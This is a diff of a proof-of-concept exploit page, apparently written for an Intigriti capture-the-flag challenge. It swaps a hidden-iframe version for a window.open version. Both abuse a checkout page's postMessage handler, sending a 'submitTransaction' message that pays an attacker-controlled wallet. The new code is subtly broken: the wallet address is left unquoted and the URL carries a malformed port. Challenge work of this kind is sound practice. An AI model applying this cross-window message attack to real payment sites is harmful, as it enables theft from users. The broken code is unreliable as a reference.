@@ -1,25 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>POC</title>
-</head>
-<body>
-  <h1>Proof of Concept</h1>
-  <iframe id="exploitFrame" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="display:none;"></iframe>
-  <script>
-    const iframe = document.getElementById('exploitFrame');
-    iframe.onload = function() {
-      setTimeout(function() {
-        iframe.contentWindow.postMessage({
-          type: 'submitTransaction',
-          transaction: {
-            toAddress: '10bcb878fee5243f6198045a60c49cba2b',
-            currency: '1337COIN',
-            amount: 1337
-          }
-        }, '*');
-      }, 5000);  // Increased delay for full load
-    };
-  </script>
-</body>
-</html>
+<script>
+    const ATTACKER_WALLET = '1ad4432c504858a8d1e4994eb4edaf52cf';
+    const AMOUNT = 1337;
+
+    // Open checkout page
+    const target = window.open(
+      'http://challenge-0126.intigriti.io/:8080/checkout.html?currency=BTC&price=45000',
+      '_blank'
+    );
+
+    // Leave enough time for background requests to finish first, then exploit
+    setTimeout(() => {
+      target.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+          toAddress: 1ad4432c504858a8d1e4994eb4edaf52cf,
+          currency: '1337COIN',
+          amount: 3
+        }
+      }, '*');
+    }, 10000);
+</script>
